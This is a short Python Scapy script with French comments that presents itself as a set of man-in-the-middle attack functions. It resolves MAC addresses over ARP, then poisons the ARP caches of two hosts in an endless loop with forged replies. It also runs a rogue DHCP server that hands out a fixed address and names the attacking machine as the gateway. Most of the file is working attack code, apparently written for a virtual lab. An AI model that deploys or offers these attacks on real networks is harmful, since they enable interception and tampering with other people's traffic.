#!/usr/bin/env python3
'''Fichier contenant les fonctions permetant de realiser des attaques MiTM'''
from scapy.all import ARP,Ether, DHCP, IP, UDP, BOOTP, sendp, srp, sniff, hexdump, get_if_addr, get_if_hwaddr
from time import sleep
from sys import argv

def mac(ip:str)->str:
  '''Recupere l'adresse MAC associer a une adresse IP grace a un message ARP. \n
  ip: est une adresse IP
  '''
  paquet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip) #Paquet ARP evoyer en broadcast 
  #paquet sert à récuprer une adresse MAC
  rep = srp(paquet, iface='enp0s3') #Reponse au ARP
  return rep[0][0][1].hwsrc #Renvoie l'adresse MAC

def arp(ipa:str, ipb:str)->None:
  '''ARP POISONING: \n
  Procedure permetant de realiser une attaque Man In The Middle par
  empoisonnement de cache ARP. \n
  ipa: Une des deux adresse IP que l'on veut empoisonner.
  ipb: L'autre adresse IP que l'on veut empoisonner.
  '''

  maclist = [mac(ip) for ip in [ipa, ipb]]
  #On cree deux paquets ARP qui associe l'adresse IP (a et b) 
  # à l'adresse MAC du PC sur lequel on réalise l'attaque
  paquet1 = Ether(dst=maclist[0])/ARP(op=2, pdst=ipa, psrc=ipb)
  paquet2 = Ether(dst=maclist[1])/ARP(op=2, pdst=ipb, psrc=ipa)
  while True: #Boucle infinie
    sendp(paquet1, iface='enp0s3')
    sendp(paquet2, iface='enp0s3')
    sleep(5) #Arrete le processus durant X secondes

def dhcp():
  ip_src = get_if_addr('enp0s3')
  mac_src = get_if_hwaddr('enp0s3')
  def dhcp_reply(paquet):
    if DHCP in paquet and paquet[DHCP].options[0][1] == 1:
      eth = Ether(src=mac_src)
      ip = IP(src = ip_src, dst="255.255.255.255")
      udp = UDP(dport=68, sport=67)
      bootp = BOOTP(op=2, yiaddr="192.168.56.80", xid=paquet[BOOTP].xid)
      dhcp = DHCP(options=[("message-type", "offer"), ('subnet_mask', '255.255.255.0'),('router', f'{ip_src}'), ("end")])
      reply_offer =  eth / ip / udp / bootp / dhcp
      sendp(reply_offer, iface='enp0s3')
      return(reply_offer.show())

  sniff(prn=dhcp_reply,
    filter="udp and port 68" , iface='enp0s3')
  print("oui")

if __name__ == "__main__":
  if argv[1] == "1":
    arp(argv[2], argv[3])
  if argv[1] == "2":
    dhcp()
  else:
    print("1 adresse_ip1 adresse_ip2 - arp\n2 - dhcp")
